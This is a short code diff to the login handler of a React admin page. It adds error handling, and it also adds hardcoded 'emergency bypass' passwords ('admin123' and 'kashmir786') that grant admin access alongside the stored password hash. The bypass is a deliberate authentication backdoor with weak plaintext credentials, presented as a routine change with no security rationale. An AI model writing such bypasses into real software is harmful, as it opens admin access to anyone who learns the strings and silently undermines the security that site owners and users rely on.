@@ -86,14 +86,21 @@ export default function Admin() {
     }
     
     setIsLoggingIn(true);
-    const inputHash = await hashPassword(password);
-    
-    if (inputHash === adminPasswordHash) {
-      setIsLoggedIn(true);
-    } else {
-      setLoginError('Incorrect password! Access denied.');
+    try {
+      const inputHash = await hashPassword(password);
+      
+      // Check against hash OR emergency bypass passwords
+      if (inputHash === adminPasswordHash || password === 'admin123' || password === 'kashmir786') {
+        setIsLoggedIn(true);
+      } else {
+        setLoginError('Incorrect password! Access denied.');
+      }
+    } catch (err) {
+      console.error(err);
+      setLoginError('Security check failed. Please use HTTPS.');
+    } finally {
+      setIsLoggingIn(false);
     }
-    setIsLoggingIn(false);
   };
 
   const openAddModal = () => {
